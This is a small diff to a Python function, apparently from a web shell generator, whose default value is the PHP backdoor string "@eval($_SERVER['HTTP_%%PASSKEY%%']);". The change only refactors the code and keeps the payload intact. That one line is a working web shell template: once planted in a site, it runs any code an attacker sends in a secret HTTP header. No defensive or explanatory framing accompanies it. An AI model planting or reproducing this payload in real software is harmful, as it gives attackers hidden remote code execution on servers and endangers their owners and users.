@@ -26,5 +26,4 @@ def setter(value):
 
 
 def default_value():
-    raw_value = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
-    return setter(raw_value)
+    return("@eval($_SERVER['HTTP_%%PASSKEY%%']);")
